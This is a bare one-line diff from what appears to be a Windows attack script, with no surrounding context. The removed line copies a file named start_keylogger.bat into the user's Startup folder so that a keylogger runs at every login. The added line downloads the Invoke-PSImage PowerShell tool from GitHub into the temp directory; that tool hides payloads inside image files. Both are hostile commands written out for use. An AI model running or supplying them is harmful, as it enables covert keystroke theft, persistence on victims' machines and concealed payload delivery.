@@ -1,1 +1,1 @@
-copy C:\ProgramData\start_keylogger.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/peewpw/Invoke-PSImage/master/Invoke-PSImage.ps1" -OutFile "$env:TEMP\Invoke-PSImage.ps1"
